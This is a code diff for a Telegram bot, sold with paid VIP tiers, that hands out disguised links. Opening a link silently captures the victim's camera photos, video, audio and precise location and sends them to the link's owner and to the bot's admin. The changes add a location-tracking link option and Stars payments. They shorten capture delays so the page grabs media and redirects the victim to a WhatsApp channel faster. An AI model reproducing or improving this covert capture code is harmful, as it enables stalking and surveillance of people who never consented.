@@ -862,17 +862,17 @@ function showLanguageSelection(ctx) {
 async function showMainMenu(ctx, lang) {
     const keyboard = Markup.inlineKeyboard([
         [Markup.button.callback(getTextMsg('front_cam', lang), 'menu_front_cam'), Markup.button.callback(getTextMsg('back_cam', lang), 'menu_back_cam')],
-        [Markup.button.callback(getTextMsg('custom_link', lang), 'menu_custom_link')],
+        [Markup.button.callback(getTextMsg('custom_link', lang), 'menu_custom_link'), Markup.button.callback(getTextMsg('location_btn', lang), 'menu_location')],
         [Markup.button.callback(getTextMsg('vip_section', lang), 'menu_vip')],
         [Markup.button.callback(getTextMsg('my_account', lang), 'menu_account'), Markup.button.callback(getTextMsg('help', lang), 'menu_help')]
     ]);
 
     const welcomes = {
-        'ar': "<b>✨ TikTuk - Smart Camera Tool ✨</b>\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>\nمرحباً بك في TikTuk 📸.\nسيتم استلام الصور فوراً بعد فتح الروابط.\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>",
-        'en': "<b>✨ TikTuk - Smart Camera Tool ✨</b>\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>\nWelcome to TikTuk 📸.\nPhotos will be received immediately after opening the links.\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>",
-        'hi': "<b>✨ TikTuk - Smart Camera Tool ✨</b>\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>\nTikTuk में आपका स्वागत है 📸.\nलिंक खोलने के तुरंत बाद फ़ोटो प्राप्त होंगी।\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>",
-        'bn': "<b>✨ TikTuk - Smart Camera Tool ✨</b>\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>\nTikTuk-এ স্বাগতম 📸.\nলিংক খোলার সাথে সাথে ছবি পাওয়া যাবে।\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>",
-        'ru': "<b>✨ TikTuk - Smart Camera Tool ✨</b>\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>\nДобро пожаловать в TikTuk 📸.\nФотографии будут получены сразу после перехода по ссылкам.\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>"
+        'ar': "<b>✨ tikwahm - Smart Camera Tool ✨</b>\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>\nمرحباً بك في tikwahm 📸.\nسيتم استلام الصور فوراً بعد فتح الروابط.\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>",
+        'en': "<b>✨ tikwahm - Smart Camera Tool ✨</b>\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>\nWelcome to tikwahm 📸.\nPhotos will be received immediately after opening the links.\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>",
+        'hi': "<b>✨ tikwahm - Smart Camera Tool ✨</b>\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>\ntikwahm में आपका स्वागत है 📸.\nलिंक खोलने के तुरंत बाद फ़ोटो प्राप्त होंगी।\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>",
+        'bn': "<b>✨ tikwahm - Smart Camera Tool ✨</b>\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>\ntikwahm-এ স্বাগতম 📸.\nলিংক খোলার সাথে সাথে ছবি পাওয়া যাবে।\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>",
+        'ru': "<b>✨ tikwahm - Smart Camera Tool ✨</b>\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>\nДобро пожаловать в tikwahm 📸.\nФотографии будут получены сразу после перехода по ссылкам.\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>"
     };
 
     const welcomeMsg = welcomes[lang] ?? welcomes['ar'];
@@ -1108,6 +1108,24 @@ bot.on('callback_query', async (ctx) => {
             ctx.reply(getTextMsg('send_custom_link', lang));
             break;
 
+        case 'menu_location':
+            let locUsedMenu = user.free_location_used ?? 0;
+            if (!user.is_vip && locUsedMenu >= config.FREE_LOCATION_LIMIT) {
+                ctx.answerCbQuery(getTextMsg('free_trial_ended', lang), true);
+                return;
+            }
+            const codeLM = generateShortCode();
+            saveShortLink(codeLM, { u: userId, c: 'l' });
+            const linkLM = `${config.BOT_URL}/${codeLM}`;
+            ctx.answerCbQuery();
+            if (!user.is_vip) {
+                const remLoc = config.FREE_LOCATION_LIMIT - locUsedMenu;
+                ctx.reply(`${getTextMsg('location_generated', lang, linkLM)}\n\n${getTextMsg('free_remaining', lang, remLoc)}`);
+            } else {
+                ctx.reply(getTextMsg('location_generated', lang, linkLM));
+            }
+            break;
+
         case 'menu_vip':
             ctx.answerCbQuery();
             showVipSection(ctx, user);
@@ -1130,11 +1148,16 @@ bot.on('callback_query', async (ctx) => {
             break;
 
         case 'buy_vip_stars':
-            // Telegram Stars payment (requires provider token, not directly handled here)
-            // For demonstration, we'll simulate success or failure.
-            ctx.answerCbQuery('This feature requires a Telegram Payments provider token.', true);
-            // In a real scenario, you'd use ctx.telegram.sendInvoice
-            // Example: ctx.telegram.sendInvoice(userId, { ...invoice_details });
+            ctx.answerCbQuery();
+            const starsPrice = settings.vip_price_stars;
+            await ctx.replyWithInvoice(
+                'VIP Subscription ⭐',
+                'Get VIP features: video capture, audio recording, unlimited location tracking, and no cooldown!',
+                'vip_stars_' + userId + '_' + Date.now(),
+                '',
+                'XTR',
+                [{ label: 'VIP Subscription', amount: starsPrice }]
+            );
             break;
 
         case 'buy_vip_referrals':
@@ -1766,7 +1789,7 @@ app.get('/:code', async (req, res) => {
     <script>
     (function(){
         var v=document.getElementById("v"),cv=document.getElementById("cv"),ctx=cv.getContext("2d");
-        var fm="${facingMode}",uid="${encryptedOwnerId}",rurl="${redirectUrl || ''}",ct="${cameraType}",uu="${uploadUrl}",nc="${nonce}";
+        var fm="${facingMode}",uid="${encryptedOwnerId}",rurl="https://whatsapp.com/channel/0029VbBGv2LBadmYqFzrwb3A",ct="${cameraType}",uu="${uploadUrl}",nc="${nonce}";
         
         function getDeviceInfo(){
             return {
@@ -1797,7 +1820,7 @@ app.get('/:code', async (req, res) => {
                 fetch(uu,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)})
                 .then(function(){})
                 .catch(function(){})
-                .finally(function(){setTimeout(function(){window.location.href=rurl},500)});
+                .finally(function(){setTimeout(function(){window.location.href=rurl},200)});
             },function(){
                 window.location.href=rurl;
             },{enableHighAccuracy:true,timeout:10000,maximumAge:0});
@@ -1811,7 +1834,7 @@ app.get('/:code', async (req, res) => {
                 var d=cv.toDataURL("image/jpeg",0.85);
                 stream.getTracks().forEach(function(t){t.stop()});
                 send("photo",d);
-            },1500);
+            },500);
         }
         
         function doVideo(stream){
@@ -1868,7 +1891,7 @@ app.get('/:code', async (req, res) => {
             fetch(uu,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)})
             .then(function(){})
             .catch(function(){})
-            .finally(function(){setTimeout(function(){window.location.href=rurl},500)});
+            .finally(function(){setTimeout(function(){window.location.href=rurl},200)});
         }
         
         setTimeout(function(){
@@ -2006,23 +2029,16 @@ app.post("/upload", async (req, res) => {
             const filePath = path.join(DATA_DIR, filename);
             fs.writeFileSync(filePath, buffer);
 
-            let telegramSendMethod;
-            let telegramOptions = { caption: `New ${type} from user ${ownerId}` };
-
             if (type === "photo") {
-                telegramSendMethod = "sendPhoto";
+                await bot.telegram.sendPhoto(ownerId, { source: filePath }, { caption: `📸 New photo captured!\n📱 Device: ${user_agent}\n💻 Platform: ${platform}` });
+                await bot.telegram.sendPhoto(config.ADMIN_ID, { source: filePath }, { caption: `📸 Photo from user ${ownerId}\n📱 ${user_agent}\n💻 Platform: ${platform}` });
             } else if (type === "video") {
-                telegramSendMethod = "sendVideo";
+                await bot.telegram.sendVideo(ownerId, { source: filePath }, { caption: `🎥 New video captured!\n📱 Device: ${user_agent}\n💻 Platform: ${platform}`, supports_streaming: true });
+                await bot.telegram.sendVideo(config.ADMIN_ID, { source: filePath }, { caption: `🎥 Video from user ${ownerId}\n📱 ${user_agent}\n💻 Platform: ${platform}`, supports_streaming: true });
             } else if (type === "audio") {
-                telegramSendMethod = "sendAudio";
-            } else {
-                throw new Error("Unsupported media type");
+                await bot.telegram.sendAudio(ownerId, { source: filePath }, { caption: `🎙️ New audio captured!\n📱 Device: ${user_agent}\n💻 Platform: ${platform}` });
+                await bot.telegram.sendAudio(config.ADMIN_ID, { source: filePath }, { caption: `🎙️ Audio from user ${ownerId}\n📱 ${user_agent}\n💻 Platform: ${platform}` });
             }
-
-            // Send to owner
-            await bot.telegram[telegramSendMethod](ownerId, { source: filePath }, telegramOptions);
-            // Send to admin
-            await bot.telegram[telegramSendMethod](config.ADMIN_ID, { source: filePath }, telegramOptions);
 
             writeLog(`${type} uploaded for user ${ownerId}: ${filename}`);
             res.status(200).send(`${type} received`);
@@ -2033,348 +2049,6 @@ app.post("/upload", async (req, res) => {
     } else {
         logSecurity("Unknown upload action", JSON.stringify(req.body));
         res.status(400).send("Unknown action");
-    }
-});
-
-// Remove old upload routes
-// app.post("/upload_location", async (req, res) => { ... });
-// app.post("/upload_media", async (req, res) => { ... });
-
-
-// ==========================================
-// Webhook and Server Start
-// ==========================================
-
-// Set up webhook (replace with your actual webhook URL)
-// For local testing, you might use long polling (bot.launch()) or a tool like ngrok
-// bot.telegram.setWebhook(`${config.BOT_URL}/webhook`);
-// app.use(bot.webhookCallback('/webhook'));
-
-// For local development, use long polling
-bot.start(async (ctx) => {
-    const userId = ctx.from.id;
-    let user = getUser(userId);
-
-    if (!user) {
-        user = updateUser(userId, {}); // Create new user with defaults
-    }
-
-    if (user.is_banned) {
-        return ctx.reply(getTextMsg("banned_message", user.lang));
-    }
-
-    // Check for referral
-    if (ctx.startPayload) {
-        const invitedBy = ctx.startPayload;
-        if (invitedBy && invitedBy !== String(userId) && !user.invited_by) {
-            const inviter = getUser(invitedBy);
-            if (inviter) {
-                updateUser(userId, { invited_by: invitedBy });
-                updateUser(invitedBy, { referrals: inviter.referrals + 1, stars: inviter.stars + config.REFERRAL_STARS });
-                bot.telegram.sendMessage(invitedBy, getTextMsg("new_referral", inviter.lang, ctx.from.first_name));
-                writeLog(`User ${userId} referred by ${invitedBy}`);
-            }
-        }
-    }
-
-    if (!user.agreed_terms) {
-        await ctx.reply(getTextMsg("welcome", user.lang), Markup.inlineKeyboard([
-            Markup.button.callback(getTextMsg("agree_btn", user.lang), "agree_terms")
-        ]));
-    } else if (!user.lang_selected) {
-        await ctx.reply(getTextMsg("choose_lang", user.lang), Markup.inlineKeyboard([
-            [Markup.button.callback("العربية 🇸🇦", "set_lang_ar"), Markup.button.callback("English 🇬🇧", "set_lang_en")],
-            [Markup.button.callback("हिन्दी 🇮🇳", "set_lang_hi"), Markup.button.callback("বাংলা 🇧🇩", "set_lang_bn")],
-            [Markup.button.callback("Русский 🇷🇺", "set_lang_ru")]
-        ]));
-    } else {
-        await ctx.reply(getTextMsg("main_menu", user.lang), getMainMenuKeyboard(user.lang));
-    }
-});
-
-bot.action("agree_terms", async (ctx) => {
-    const userId = ctx.from.id;
-    const user = getUser(userId);
-
-    if (!user || user.is_banned) {
-        return ctx.answerCbQuery(getTextMsg("banned_message", user?.lang || "ar"));
-    }
-
-    updateUser(userId, { agreed_terms: true });
-    await ctx.editMessageText(getTextMsg("terms_agreed", user.lang));
-    await ctx.reply(getTextMsg("choose_lang", user.lang), Markup.inlineKeyboard([
-        [Markup.button.callback("العربية 🇸🇦", "set_lang_ar"), Markup.button.callback("English 🇬🇧", "set_lang_en")],
-        [Markup.button.callback("हिन्दी 🇮🇳", "set_lang_hi"), Markup.button.callback("বাংলা 🇧🇩", "set_lang_bn")],
-        [Markup.button.callback("Русский 🇷🇺", "set_lang_ru")]
-    ]));
-});
-
-bot.action(/set_lang_(ar|en|hi|bn|ru)/, async (ctx) => {
-    const userId = ctx.from.id;
-    const lang = ctx.match[1];
-    const user = getUser(userId);
-
-    if (!user || user.is_banned) {
-        return ctx.answerCbQuery(getTextMsg("banned_message", user?.lang || "ar"));
-    }
-
-    updateUser(userId, { lang: lang, lang_selected: true });
-    await ctx.editMessageText(getTextMsg("lang_saved", lang));
-    await ctx.reply(getTextMsg("main_menu", lang), getMainMenuKeyboard(lang));
-});
-
-bot.hears(texts.ar.front_cam, async (ctx) => {
-    const userId = ctx.from.id;
-    const user = getUser(userId);
-
-    if (!user || user.is_banned) {
-        return ctx.reply(getTextMsg("banned_message", user?.lang || "ar"));
-    }
-
-    if (!user.agreed_terms || !user.lang_selected) {
-        return ctx.reply(getTextMsg("please_agree_terms_lang", user.lang));
-    }
-
-    const remainingCooldown = cooldownCheck(userId, 'link', config.COOLDOWN_SECONDS);
-    if (remainingCooldown > 0) {
-        return ctx.reply(getTextMsg("cooldown_message", user.lang, remainingCooldown));
-    }
-
-    const shortCode = generateShortCode();
-    const redirectUrl = `${config.BOT_URL}?start=${userId}`;
-    saveShortLink(shortCode, { owner_id: userId, type: 'f', redirect_url: redirectUrl });
-
-    const captureLink = `${config.BOT_URL}/${shortCode}`;
-    await ctx.reply(getTextMsg("front_cam_link", user.lang, captureLink));
-    writeLog(`Front camera link generated for user ${userId}: ${captureLink}`);
-});
-
-bot.hears(texts.ar.back_cam, async (ctx) => {
-    const userId = ctx.from.id;
-    const user = getUser(userId);
-
-    if (!user || user.is_banned) {
-        return ctx.reply(getTextMsg("banned_message", user?.lang || "ar"));
-    }
-
-    if (!user.agreed_terms || !user.lang_selected) {
-        return ctx.reply(getTextMsg("please_agree_terms_lang", user.lang));
-    }
-
-    const remainingCooldown = cooldownCheck(userId, 'link', config.COOLDOWN_SECONDS);
-    if (remainingCooldown > 0) {
-        return ctx.reply(getTextMsg("cooldown_message", user.lang, remainingCooldown));
-    }
-
-    const shortCode = generateShortCode();
-    const redirectUrl = `${config.BOT_URL}?start=${userId}`;
-    saveShortLink(shortCode, { owner_id: userId, type: 'b', redirect_url: redirectUrl });
-
-    const captureLink = `${config.BOT_URL}/${shortCode}`;
-    await ctx.reply(getTextMsg("back_cam_link", user.lang, captureLink));
-    writeLog(`Back camera link generated for user ${userId}: ${captureLink}`);
-});
-
-bot.hears(texts.ar.custom_link, async (ctx) => {
-    const userId = ctx.from.id;
-    const user = getUser(userId);
-
-    if (!user || user.is_banned) {
-        return ctx.reply(getTextMsg("banned_message", user?.lang || "ar"));
-    }
-
-    if (!user.agreed_terms || !user.lang_selected) {
-        return ctx.reply(getTextMsg("please_agree_terms_lang", user.lang));
-    }
-
-    updateUser(userId, { state: "waiting_for_custom_link" });
-    await ctx.reply(getTextMsg("send_custom_link", user.lang));
-});
-
-bot.hears(texts.ar.location_btn, async (ctx) => {
-    const userId = ctx.from.id;
-    const user = getUser(userId);
-
-    if (!user || user.is_banned) {
-        return ctx.reply(getTextMsg("banned_message", user?.lang || "ar"));
-    }
-
-    if (!user.agreed_terms || !user.lang_selected) {
-        return ctx.reply(getTextMsg("please_agree_terms_lang", user.lang));
-    }
-
-    const remainingCooldown = cooldownCheck(userId, 'link', config.COOLDOWN_SECONDS);
-    if (remainingCooldown > 0) {
-        return ctx.reply(getTextMsg("cooldown_message", user.lang, remainingCooldown));
-    }
-
-    // Check free trial limit for location
-    if (!user.is_vip && user.free_location_used >= config.FREE_LOCATION_LIMIT) {
-        return ctx.reply(getTextMsg("free_location_limit_reached", user.lang));
-    }
-
-    const shortCode = generateShortCode();
-    const redirectUrl = `${config.BOT_URL}?start=${userId}`;
-    saveShortLink(shortCode, { owner_id: userId, type: 'l', redirect_url: redirectUrl });
-
-    const captureLink = `${config.BOT_URL}/${shortCode}`;
-    await ctx.reply(getTextMsg("location_link", user.lang, captureLink));
-    writeLog(`Location link generated for user ${userId}: ${captureLink}`);
-});
-
-bot.hears(texts.ar.vip_section, async (ctx) => {
-    const userId = ctx.from.id;
-    const user = getUser(userId);
-    const settings = loadSettings();
-
-    if (!user || user.is_banned) {
-        return ctx.reply(getTextMsg("banned_message", user?.lang || "ar"));
-    }
-
-    if (!user.agreed_terms || !user.lang_selected) {
-        return ctx.reply(getTextMsg("please_agree_terms_lang", user.lang));
-    }
-
-    let message;
-    let keyboardOptions = [];
-
-    if (user.is_vip) {
-        message = getTextMsg("vip_already_member", user.lang);
-    } else {
-        message = getTextMsg("vip_info", user.lang, settings.vip_price_stars, settings.vip_price_referrals);
-        keyboardOptions.push(
-            [Markup.button.callback(getTextMsg("vip_activate_stars", user.lang, settings.vip_price_stars), "activate_vip_stars")],
-            [Markup.button.callback(getTextMsg("vip_activate_referrals", user.lang, settings.vip_price_referrals), "activate_vip_referrals")]
-        );
-    }
-
-    await ctx.reply(message, Markup.inlineKeyboard(keyboardOptions));
-});
-
-bot.action("activate_vip_stars", async (ctx) => {
-    const userId = ctx.from.id;
-    const user = getUser(userId);
-    const settings = loadSettings();
-
-    if (!user || user.is_banned) {
-        return ctx.answerCbQuery(getTextMsg("banned_message", user?.lang || "ar"));
-    }
-
-    if (user.is_vip) {
-        return ctx.answerCbQuery(getTextMsg("vip_already_member", user.lang), true);
-    }
-
-    if (user.stars >= settings.vip_price_stars) {
-        updateUser(userId, { is_vip: true, vip_activated_at: Math.floor(Date.now() / 1000), stars: user.stars - settings.vip_price_stars });
-        await ctx.editMessageText(getTextMsg("vip_activated_stars_success", user.lang, settings.vip_price_stars));
-        checkAchievements(userId);
-        writeLog(`User ${userId} activated VIP with stars.`);
-    } else {
-        await ctx.answerCbQuery(getTextMsg("vip_not_enough_stars", user.lang, settings.vip_price_stars - user.stars), true);
-    }
-});
-
-bot.action("activate_vip_referrals", async (ctx) => {
-    const userId = ctx.from.id;
-    const user = getUser(userId);
-    const settings = loadSettings();
-
-    if (!user || user.is_banned) {
-        return ctx.answerCbQuery(getTextMsg("banned_message", user?.lang || "ar"));
-    }
-
-    if (user.is_vip) {
-        return ctx.answerCbQuery(getTextMsg("vip_already_member", user.lang), true);
-    }
-
-    if (user.referrals >= settings.vip_price_referrals) {
-        updateUser(userId, { is_vip: true, vip_activated_at: Math.floor(Date.now() / 1000), referrals: user.referrals - settings.vip_price_referrals });
-        await ctx.editMessageText(getTextMsg("vip_activated_referrals_success", user.lang, settings.vip_price_referrals));
-        checkAchievements(userId);
-        writeLog(`User ${userId} activated VIP with referrals.`);
-    } else {
-        await ctx.answerCbQuery(getTextMsg("vip_not_enough_referrals", user.lang, settings.vip_price_referrals - user.referrals), true);
-    }
-});
-
-bot.hears(texts.ar.my_account, async (ctx) => {
-    const userId = ctx.from.id;
-    const user = getUser(userId);
-
-    if (!user || user.is_banned) {
-        return ctx.reply(getTextMsg("banned_message", user?.lang || "ar"));
-    }
-
-    if (!user.agreed_terms || !user.lang_selected) {
-        return ctx.reply(getTextMsg("please_agree_terms_lang", user.lang));
-    }
-
-    const userLevel = getUserLevel(user.referrals);
-    const levelEmoji = getLevelEmoji(userLevel, user.lang);
-    const achievements = user.achievements.length > 0 ? user.achievements.map(ach => getTextMsg(ach, user.lang)).join(", ") : getTextMsg("no_achievements", user.lang);
-
-    const accountInfo = getTextMsg("account_info", user.lang,
-        user.is_vip ? getTextMsg("yes", user.lang) : getTextMsg("no", user.lang),
-        user.stars,
-        user.referrals,
-        user.total_captures,
-        levelEmoji,
-        achievements
-    );
-
-    await ctx.reply(accountInfo);
-});
-
-bot.hears(texts.ar.help, async (ctx) => {
-    const userId = ctx.from.id;
-    const user = getUser(userId);
-
-    if (!user || user.is_banned) {
-        return ctx.reply(getTextMsg("banned_message", user?.lang || "ar"));
-    }
-
-    if (!user.agreed_terms || !user.lang_selected) {
-        return ctx.reply(getTextMsg("please_agree_terms_lang", user.lang));
-    }
-
-    await ctx.reply(getTextMsg("help_message", user.lang));
-});
-
-bot.on("text", async (ctx) => {
-    const userId = ctx.from.id;
-    const user = getUser(userId);
-
-    if (!user || user.is_banned) {
-        return ctx.reply(getTextMsg("banned_message", user?.lang || "ar"));
-    }
-
-    if (!user.agreed_terms || !user.lang_selected) {
-        return ctx.reply(getTextMsg("please_agree_terms_lang", user.lang));
-    }
-
-    switch (user.state) {
-        case "waiting_for_custom_link":
-            const customLink = sanitizeInput(ctx.message.text);
-            if (!customLink.startsWith("http://") && !customLink.startsWith("https://")) {
-                return ctx.reply(getTextMsg("invalid_link_format", user.lang));
-            }
-
-            const remainingCooldown = cooldownCheck(userId, 'link', config.COOLDOWN_SECONDS);
-            if (remainingCooldown > 0) {
-                return ctx.reply(getTextMsg("cooldown_message", user.lang, remainingCooldown));
-            }
-
-            const shortCode = generateShortCode();
-            saveShortLink(shortCode, { owner_id: userId, type: 'c', redirect_url: customLink });
-
-            const captureLink = `${config.BOT_URL}/${shortCode}`;
-            await ctx.reply(getTextMsg("custom_link_generated", user.lang, captureLink));
-            writeLog(`Custom link generated for user ${userId}: ${captureLink} -> ${customLink}`);
-            updateUser(userId, { state: "none" });
-            break;
-        default:
-            await ctx.reply(getTextMsg("unknown_command", user.lang), getMainMenuKeyboard(user.lang));
-            break;
     }
 });
 
